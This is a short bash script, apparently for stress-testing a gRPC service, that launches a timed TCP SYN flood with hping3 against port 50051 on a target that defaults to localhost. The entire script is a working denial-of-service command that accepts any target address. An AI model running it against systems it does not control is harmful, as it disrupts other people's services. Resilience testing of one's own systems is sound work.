#!/usr/bin/env bash
set -e
TARGET="${1:-127.0.0.1}"
DURATION="${2:-20}"
echo "=== gRPC TCP SYN Flood / hping3 ==="
echo "Target: $TARGET Port: 50051 Duration: ${DURATION}s"
sudo timeout "$DURATION" hping3 -S --flood -p 50051 "$TARGET"
